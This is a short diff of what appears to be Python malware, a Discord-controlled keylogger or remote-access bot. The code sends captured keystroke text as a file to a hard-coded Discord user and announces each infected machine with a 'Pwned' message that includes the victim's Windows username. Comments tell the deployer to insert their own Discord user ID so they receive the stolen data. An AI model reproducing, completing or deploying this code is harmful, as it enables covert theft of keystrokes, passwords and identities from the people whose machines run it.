@@ -61,7 +61,7 @@ class BotStarted(discord.Client):
     async def keys_share(self):
         await asyncio.sleep(int(self.time_k))
         arr = io.StringIO(self.keys_text)
-        ch = await client.fetch_user(00000000)
+        ch = await client.fetch_user(000000) # Replace it with your discord user id
         fln = self.botname[1:] + '.txt'
         await ch.send(file=discord.File(arr, filename=fln))
 
@@ -69,7 +69,7 @@ class BotStarted(discord.Client):
         self.botname = '$Bot-' + ''.join(random.sample((string.digits + string.ascii_letters), 6))
         self.name_text = f'**{self.botname}**\n'
         osname = os.getenv('USERNAME')
-        ch = await client.fetch_user(0000000)
+        ch = await client.fetch_user(000000) # Replace it with your discord user id
         await ch.send(f'Pwned: {self.botname} == {osname}')
 
     async def on_message(self, message):
